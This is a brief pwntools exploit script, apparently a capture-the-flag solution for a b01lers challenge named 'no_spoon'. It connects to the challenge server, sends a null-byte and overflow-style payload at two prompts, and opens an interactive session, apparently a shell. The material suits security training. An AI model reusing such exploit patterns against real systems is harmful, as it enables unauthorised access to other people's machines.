from pwn import *

host = 'chal.ctf.b01lers.com'
port = 1006

p = remote(host, port)
# p = process('./no_spoon')

payload = b'A'*1 + b'\x00' + b'A'*100
p.sendlineafter(b'matrix: ', payload)
payload = b'A'*100
p.sendlineafter(b'choice: ', payload)
p.recvlines(3)
p.interactive()
